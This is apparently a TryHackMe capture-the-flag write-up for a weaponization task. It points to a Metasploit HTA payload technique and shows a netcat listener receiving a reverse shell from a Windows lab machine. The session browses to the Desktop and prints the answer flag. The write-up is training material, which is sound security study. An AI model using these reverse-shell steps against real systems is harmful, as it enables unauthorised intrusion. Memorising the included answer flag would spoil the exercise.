For reference, you can use the MSFVenom Cheat Sheet on this [website](https://thedarksource.com/msfvenom-cheat-sheet-create-metasploit-payloads/).


What is the flag? Hint: Check the user desktop folder for the flag!
(The easiest way to get reverse-shell is by applying the technique discussed in Task 4, which creates a malicious HTA link using Metasploit.)

```
┌──(kali㉿kali)-[~]
└─$ sudo nc -lvnp 443
listening on [any] 443 ...
connect to [10.11.81.220] from (UNKNOWN) [10.10.129.49] 49739
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\app>cd ..
cd ..

C:\>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 9855-3AC5

 Directory of C:\

11/27/2021  01:36 PM    <DIR>          app
07/16/2016  04:47 AM    <DIR>          PerfLogs
10/25/2021  11:49 AM    <DIR>          Program Files
10/29/2021  02:18 AM    <DIR>          Program Files (x86)
10/21/2021  02:37 AM    <DIR>          Users
10/25/2021  08:04 AM    <DIR>          Windows
               0 File(s)              0 bytes
               6 Dir(s)  36,113,199,104 bytes free

C:\>cd Users
cd Users

C:\Users>cd Desktop
cd Desktop
The system cannot find the path specified.

C:\Users>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 9855-3AC5

 Directory of C:\Users

10/21/2021  02:37 AM    <DIR>          .
10/21/2021  02:37 AM    <DIR>          ..
12/09/2016  06:10 PM    <DIR>          defaultuser0
12/09/2016  06:15 PM    <DIR>          Public
09/10/2022  09:11 AM    <DIR>          thm
               0 File(s)              0 bytes
               5 Dir(s)  36,113,199,104 bytes free

C:\Users>cd thm
cd thm

C:\Users\thm>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 9855-3AC5

 Directory of C:\Users\thm

09/10/2022  09:11 AM    <DIR>          .
09/10/2022  09:11 AM    <DIR>          ..
10/21/2021  02:34 AM    <DIR>          Contacts
11/27/2021  11:25 AM    <DIR>          Desktop
10/21/2021  02:34 AM    <DIR>          Documents
11/27/2021  11:32 AM    <DIR>          Downloads
10/21/2021  02:34 AM    <DIR>          Favorites
10/21/2021  02:34 AM    <DIR>          Links
10/21/2021  02:34 AM    <DIR>          Music
10/29/2021  02:18 AM    <DIR>          OneDrive
10/21/2021  02:38 AM    <DIR>          Pictures
10/21/2021  02:34 AM    <DIR>          Saved Games
10/21/2021  02:35 AM    <DIR>          Searches
10/21/2021  02:34 AM    <DIR>          Videos
               0 File(s)              0 bytes
              14 Dir(s)  36,113,199,104 bytes free

C:\Users\thm>cd Desktop
cd Desktop

C:\Users\thm\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 9855-3AC5

 Directory of C:\Users\thm\Desktop

11/27/2021  11:25 AM    <DIR>          .
11/27/2021  11:25 AM    <DIR>          ..
11/27/2021  11:25 AM                37 flag.txt
               1 File(s)             37 bytes
               2 Dir(s)  36,113,199,104 bytes free

C:\Users\thm\Desktop>more flag.txt
more flag.txt
THM{b4dbc2f16afdfe9579030a929b799719}
```

*THM{b4dbc2f16afdfe9579030a929b799719}*

[[Intro to C2]]